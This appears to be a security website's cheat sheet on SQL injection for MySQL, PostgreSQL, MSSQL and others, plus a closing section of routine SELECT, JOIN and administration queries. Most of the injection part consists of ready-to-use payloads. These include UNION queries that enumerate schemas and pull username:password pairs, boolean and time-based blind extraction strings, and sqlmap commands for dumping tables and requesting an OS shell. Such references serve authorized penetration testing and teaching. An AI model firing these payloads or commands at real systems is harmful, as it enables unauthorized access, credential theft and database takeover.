---
title: "SQL Injection & Database Queries: Pentester's Reference"
description: "SQL injection payloads, UNION attacks, blind SQLi techniques, and standard database queries for MySQL and PostgreSQL. A tactical reference for penetration testers and database administrators."
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["sql injection payloads", "mysql commands cheatsheet", "postgresql cheat sheet", "database hacking", "sqlmap commands", "union sql injection", "blind sql injection", "sql injection testing", "database enumeration", "sql injection prevention"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQL Injection & Database Queries: Pentester's Reference",
    "description": "SQL injection payloads, UNION attacks, blind SQLi, and database queries for MySQL and PostgreSQL.",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "en"
  }
---

## System Init

SQL injection remains one of the most critical web application vulnerabilities — consistently ranked in the OWASP Top 10. It occurs when user input is concatenated directly into SQL queries without proper sanitization, allowing an attacker to manipulate the database query logic. A successful SQL injection can lead to complete data exfiltration, authentication bypass, privilege escalation, and in some cases, remote command execution on the database server. This field manual provides both the offensive payloads for authorized penetration testing and the standard SQL queries every database administrator needs to know.

All injection techniques are for authorized testing only. Unauthorized access is illegal.

---

## SQLi Detection

Before exploiting a SQL injection vulnerability, you need to confirm it exists. Detection involves sending specially crafted input to application parameters and observing the response for error messages, behavioral changes, or timing differences. These initial probes tell you whether the parameter is injectable and what type of injection is possible.

### Basic detection payloads

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Identifying the database backend

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## UNION Attacks

UNION-based SQL injection is the most powerful technique when error messages or query results are displayed on the page. It works by appending a `UNION SELECT` statement to the original query, allowing you to extract data from any table in the database. The key requirement is determining the correct number of columns in the original query so that the UNION statement matches.

### Determine column count

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### Extract data

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## Blind SQL Injection

When the application does not display query results or error messages on the page, you are dealing with blind SQL injection. The vulnerability still exists, but data extraction requires inference — either through boolean conditions (does the page change?) or time delays (does the response take longer?). Blind SQLi is slower but equally dangerous.

### Boolean-based blind

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### Time-based blind

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## SQLMap Automation

SQLMap is the industry-standard tool for automated SQL injection detection and exploitation. It handles detection, fingerprinting, data extraction, and even OS-level access through SQL injection — all from the command line. For authorized penetration tests, it dramatically accelerates the exploitation phase.

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## Standard SQL Queries

Beyond injection testing, every security professional and developer needs to know standard SQL for database administration, log analysis, and data extraction during investigations. These queries work across MySQL and PostgreSQL and cover the most common database operations.

### SELECT queries

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### JOIN queries

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT, UPDATE, DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### Database administration

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
